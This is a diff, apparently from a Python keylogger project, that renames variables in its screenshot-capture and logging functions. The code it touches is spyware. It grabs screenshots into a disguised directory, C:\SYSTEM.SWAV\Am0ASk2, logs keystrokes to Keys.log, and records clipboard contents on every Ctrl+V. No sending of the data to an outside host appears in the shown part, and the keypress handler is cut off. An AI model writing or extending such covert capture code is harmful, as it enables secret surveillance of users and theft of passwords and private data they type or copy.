@@ -19,35 +19,35 @@ class capture():
         pass
 
     def capture():
-        save_path = '{0}{1}{2}'.format(
+        savePath = '{0}{1}{2}'.format(
             'C:\\SYSTEM.SWAV\\Am0ASk2\\screenshot', capture.n, '.jpg')
         # grabs screenshots
         screenshot = ImageGrab.grab()
-        screenshot.save(save_path)
+        screenshot.save(savePath)
         # stores the screenshots
-        if os.path.exists(save_path):
+        if os.path.exists(savePath):
             print('Expected')
             capture.n += 1
-            save_path = '{0}{1}{2}'.format(
+            savePath = '{0}{1}{2}'.format(
                 'C:\\SYSTEM.SWAV\\Am0ASk2\\screanshot', capture.n, '.jpg')
             screenshot = ImageGrab.grab()
-            screenshot.save(save_path)
-            os.remove(save_path)
+            screenshot.save(savePath)
+            os.remove(savePath)
 
 
 def logger():
-    log_dir = "C:\\SYSTEM.SWAV"
-    logging.basicConfig(filename=(os.path.join(log_dir, "Keys.log")), filemode="w", format='%(asctime)s:%(message)s',
+    logDir = "C:\\SYSTEM.SWAV"
+    logging.basicConfig(filename=(os.path.join(logDir, "Keys.log")), filemode="w", format='%(asctime)s:%(message)s',
                         level=logging.DEBUG)
 
     def ctrl_V():
 
         # detects ctrl+v events
         win32clipboard.OpenClipboard()
-        pasted_value = win32clipboard.GetClipboardData(1)
+        pastedValue = win32clipboard.GetClipboardData(1)
         win32clipboard.CloseClipboard()
         logging.warning('------------------')
-        logging.warning('{0} {1}'.format('Ctrl-V pressed: ', pasted_value))
+        logging.warning('{0} {1}'.format('Ctrl-V pressed: ', pastedValue))
         logging.warning('------------------')
 
     def on_press(key):
